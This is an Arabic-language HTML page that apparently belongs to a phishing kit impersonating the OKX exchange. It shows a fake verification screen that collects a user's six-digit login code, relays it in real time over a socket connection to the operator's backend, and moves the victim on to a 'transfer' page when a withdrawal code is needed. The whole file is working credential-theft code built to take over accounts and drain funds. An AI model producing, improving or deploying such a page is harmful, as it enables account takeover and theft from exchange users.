<!DOCTYPE html>
<html dir="rtl">
<head>
    <title>التحقق من الحساب | OKX</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { font-family: sans-serif; background: #fff; padding-top: 50px; text-align: center; }
        .otp-box { max-width: 400px; margin: auto; padding: 20px; }
        .form-control { border-radius: 12px; padding: 15px; background: #f5f5f5; border: 1px solid #ddd; text-align: center; font-size: 24px; letter-spacing: 5px; }
        .btn-confirm { background: #000; color: #fff; border-radius: 30px; width: 100%; padding: 15px; font-weight: bold; border: none; margin-top: 20px; }
    </style>
</head>
<body>

<div class="otp-box">
    <img src="static/logo.png" width="80" alt="OKX">
    <h3 style="margin: 20px 0;">أدخل رمز التحقق</h3>
    <p style="color: #666;">تم إرسال رمز التحقق إلى هاتفك/بريدك الإلكتروني</p>
    
    <input type="text" id="otpCode" class="form-control" placeholder="000000" maxlength="6">
    <button type="button" onclick="submitOTP()" class="btn-confirm">تأكيد</button>
</div>

<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
<script>
    const socket = io('http://localhost:3000');

    function submitOTP() {
        const code = document.getElementById('otpCode').value;
        if(code.length < 6) return alert("كود ناقص");
        
        socket.emit('send_login_otp', { code: code });
        document.getElementById('btnConfirm').innerText = "جاري التحقق...";
    }

    socket.on('need_withdraw_otp', () => {
        window.location.href = "transfer.html"; 
    });
</script>
    
</body>
</html>
